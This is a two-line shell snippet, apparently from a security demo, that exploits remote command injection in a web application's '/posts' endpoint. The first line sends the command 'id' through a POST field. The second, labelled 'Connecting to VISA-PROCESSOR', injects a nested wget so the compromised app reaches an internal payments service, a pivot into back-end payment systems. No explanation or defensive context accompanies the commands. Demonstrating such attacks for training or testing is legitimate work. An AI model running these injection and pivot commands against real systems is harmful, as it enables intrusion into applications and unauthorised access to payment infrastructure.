wget -q -O - --post-data 'cmd=id' http://zeroday-zeroday.apps.ocp.ralvares.com/posts

echo "Connecting to VISA-PROCESSOR.." && wget -q -O - --post-data 'cmd=wget -O - http://visa-processor-service.payments:8080' http://zeroday-zeroday.apps.ocp.ralvares.com/posts
